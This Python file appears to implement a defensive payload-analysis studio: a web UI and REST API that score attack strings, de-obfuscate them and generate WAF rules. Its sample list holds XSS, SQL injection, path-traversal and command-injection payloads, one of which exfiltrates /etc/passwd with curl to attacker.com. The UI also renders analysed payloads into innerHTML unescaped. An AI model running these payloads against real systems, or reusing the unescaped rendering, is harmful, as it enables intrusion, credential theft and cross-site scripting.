"""
Google Material 3 Payload Entropy & Threat Studio UI & REST API Server.
Zero third-party runtime dependencies.
"""

from __future__ import annotations

import json
import os
import sys
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Dict, Optional

from payload_entropy_studio.deobfuscator import DeobfuscationEngine
from payload_entropy_studio.entropy_engine import analyze_entropy_profile
from payload_entropy_studio.threat_analyzer import ThreatAnalyzer
from payload_entropy_studio.waf_generator import generate_waf_rules

SERVER_START_TIME = time.time()

EMBEDDED_STUDIO_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Payload & Entropy Studio | Security Intelligence</title>
  <style>
    :root {
      --g-blue: #1a73e8;
      --g-blue-dark: #1557b0;
      --g-blue-light: #e8f0fe;
      --g-green: #1e8e3e;
      --g-green-light: #e6f4ea;
      --g-red: #d93025;
      --g-red-light: #fce8e6;
      --surface: #ffffff;
      --surface-variant: #f8f9fa;
      --border: #dadce0;
      --text: #202124;
      --text-secondary: #5f6368;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Google Sans", "Segoe UI", Roboto, sans-serif; background: var(--surface-variant); color: var(--text); height: 100vh; display: flex; flex-direction: column; }
    header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 0.75rem 1.5rem; display: flex; justify-content: space-between; align-items: center; }
    .brand { font-size: 1.15rem; font-weight: 600; color: var(--g-blue); display: flex; align-items: center; gap: 0.5rem; }
    .container { display: grid; grid-template-columns: 320px 1fr; flex: 1; overflow: hidden; }
    aside { background: var(--surface); border-right: 1px solid var(--border); padding: 1.25rem; overflow-y: auto; display: flex; flex-direction: column; gap: 1rem; }
    main { padding: 1.5rem; overflow-y: auto; display: flex; flex-direction: column; gap: 1.25rem; }
    .card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; }
    .btn { background: var(--g-blue); color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; font-weight: 600; cursor: pointer; }
    textarea { width: 100%; padding: 0.5rem 0.75rem; border: 1px solid var(--border); border-radius: 6px; font-family: monospace; font-size: 0.95rem; }
  </style>
</head>
<body>
  <header>
    <div class="brand"><span>🛡️</span> Google Payload & Entropy Studio</div>
  </header>
  <div class="container">
    <aside>
      <h3>Attack Examples</h3>
      <button class="btn" style="width:100%; margin-bottom:6px;" onclick="loadSample('xss')">XSS Vector</button>
      <button class="btn" style="width:100%; margin-bottom:6px;" onclick="loadSample('sqli')">SQLi Union</button>
      <button class="btn" style="width:100%; margin-bottom:6px;" onclick="loadSample('lfi')">LFI Traversal</button>
      <button class="btn" style="width:100%; margin-bottom:6px;" onclick="loadSample('cmd')">Cmd Injection</button>
    </aside>
    <main>
      <div class="card">
        <h3>Input Attack Payload</h3>
        <textarea id="payload-input" rows="3">%3Cscript%3Ealert(document.cookie)%3C/script%3E</textarea>
        <button class="btn" style="margin-top:0.75rem;" onclick="analyzePayload()">Analyze Security Threat</button>
      </div>
      <div class="card" id="analysis-box">
        <h3>Threat Evaluation</h3>
        <p id="threat-summary">Ready for security audit.</p>
      </div>
    </main>
  </div>
  <script>
    const samples = {
      xss: '%3Cscript%3Ealert(document.cookie)%3C/script%3E',
      sqli: "1' UNION SELECT 1,username,password FROM users--",
      lfi: '%252e%252e%252f%252e%252e%252fetc/passwd',
      cmd: '; cat /etc/passwd | curl -X POST https://attacker.com/data'
    };
    function loadSample(k) {
      document.getElementById('payload-input').value = samples[k];
      analyzePayload();
    }
    async function analyzePayload() {
      const payload = document.getElementById('payload-input').value;
      const resp = await fetch('/api/analyze', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({payload})
      });
      const data = await resp.json();
      document.getElementById('threat-summary').innerHTML = `<strong>${data.primary_threat}</strong> (Severity: ${data.severity}, Risk: ${data.risk_score}/100)<br>Shannon Entropy: ${data.entropy.shannon_entropy} bits<br>Normalized: <code>${data.normalized_payload}</code>`;
    }
    analyzePayload();
  </script>
</body>
</html>"""


class PayloadHTTPHandler(BaseHTTPRequestHandler):
    """HTTP Request Handler for Studio Web UI and REST API."""

    def _set_cors_headers(self) -> None:
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def _send_json(self, data: Any, status: int = 200) -> None:
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self._set_cors_headers()
        self.end_headers()

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/api/health":
            self._send_json({
                "status": "ok",
                "service": "payload-entropy-studio",
                "uptime_seconds": round(time.time() - SERVER_START_TIME, 2),
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            })
            return

        elif path == "/api/diagnostics":
            self._send_json({
                "platform": sys.platform,
                "python": sys.version,
                "zero_dependencies": True,
                "status": "HEALTHY"
            })
            return

        # Serve UI from public/index.html
        public_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "public"))
        index_file = os.path.join(public_dir, "index.html")

        if os.path.isfile(index_file) and path in ("/", "/index.html"):
            with open(index_file, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self._set_cors_headers()
            self.end_headers()
            self.wfile.write(content)
            return

        # Embedded UI fallback
        body = EMBEDDED_STUDIO_HTML.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length) if length > 0 else b"{}"

        try:
            body = json.loads(raw_body.decode("utf-8"))
        except Exception:
            self._send_json({"error": "Invalid JSON"}, status=400)
            return

        payload = body.get("payload", "")
        analyzer = ThreatAnalyzer()
        deobfuscator = DeobfuscationEngine()

        if path == "/api/analyze":
            report = analyzer.analyze(payload)
            self._send_json(report.to_dict())
            return

        elif path == "/api/deobfuscate":
            res = deobfuscator.deobfuscate(payload)
            self._send_json(res.to_dict())
            return

        elif path == "/api/entropy":
            w_size = int(body.get("window_size", 32))
            rep = analyze_entropy_profile(payload, window_size=w_size)
            self._send_json(rep.to_dict())
            return

        elif path == "/api/waf":
            report = analyzer.analyze(payload)
            rules = generate_waf_rules(report)
            self._send_json({
                "threat": report.primary_threat,
                "severity": report.severity.value,
                "rules": rules
            })
            return

        self._send_json({"error": f"Endpoint not found: {path}"}, status=404)

    def log_message(self, format: str, *args: Any) -> None:
        pass


def run_ui_server(host: str = "0.0.0.0", port: int = 8095) -> ThreadingHTTPServer:
    """Launch UI HTTP Server."""
    server = ThreadingHTTPServer((host, port), PayloadHTTPHandler)
    return server
